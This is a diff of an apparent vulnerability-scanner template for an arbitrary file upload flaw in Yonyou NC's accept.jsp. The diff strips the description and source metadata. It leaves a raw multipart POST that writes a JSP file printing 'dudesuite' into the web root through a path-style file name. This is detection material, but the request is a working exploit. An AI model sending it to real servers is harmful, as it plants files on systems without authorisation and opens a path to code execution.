@@ -3,12 +3,8 @@ info:
   name: 用友NC accept.jsp任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/drv7xm6iiompws36'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: drv7xm6iiompws36
-    fofa: 暂无
 http:
 - raw:
   - 'POST /aim/equipmap/accept.jsp HTTP/1.1
@@ -26,8 +22,6 @@ http:
     Content-Type: multipart/form-data; boundary=---------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc
 
 
-
-
     -----------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc
 
 
@@ -37,8 +31,6 @@ http:
     Content-Type: text/plain
 
 
-
-
     <% out.println("dudesuite"); %>
 
 
@@ -46,8 +38,6 @@ http:
 
 
     Content-Disposition: form-data; name="fname"
-
-
 
 
     \webapps\nc_web\dudesuite.jsp
